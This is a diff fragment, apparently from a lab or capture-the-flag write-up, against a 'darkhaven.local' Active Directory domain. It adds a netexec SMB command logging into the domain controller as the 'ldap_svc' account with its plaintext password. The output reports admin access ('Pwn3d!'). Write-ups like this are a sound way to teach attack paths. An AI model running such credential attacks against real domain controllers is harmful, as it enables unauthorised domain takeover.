@@ -454,5 +454,9 @@ The ca service account is already compromised
 And the administrator on this machine is already compromised so the only interesting thing here is the ldap svc
 
 ```python
-
+nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k                        
+SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
+SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
 ```
+Using kerberos authentication i see that the ldap_svc account is an administrator on the domain controller
+
